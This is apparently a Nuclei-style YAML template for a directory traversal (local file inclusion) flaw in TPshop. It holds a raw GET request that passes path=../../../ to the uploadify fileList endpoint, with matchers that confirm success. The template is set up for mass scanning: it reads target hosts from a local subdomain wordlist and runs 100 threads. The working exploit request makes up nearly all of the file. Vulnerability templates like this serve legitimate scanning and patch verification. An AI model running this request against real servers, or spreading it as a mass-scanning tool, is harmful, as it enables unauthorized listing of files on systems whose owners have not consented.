id: tpshop-directory-traversal

info:
  name: TPshop - Local File Inclusion
  author: pikpikcu
  description: TPshop is vulnerable to local file inclusion.
  severity: high
  reference:
    - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  tags: tpshop,lfi

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /index.php/Home/uploadify/fileList?type=.+&path=../../../ HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:

      - type: word
        words:
          - '"state":"SUCCESS"'

      - type: status
        status:
          - 200

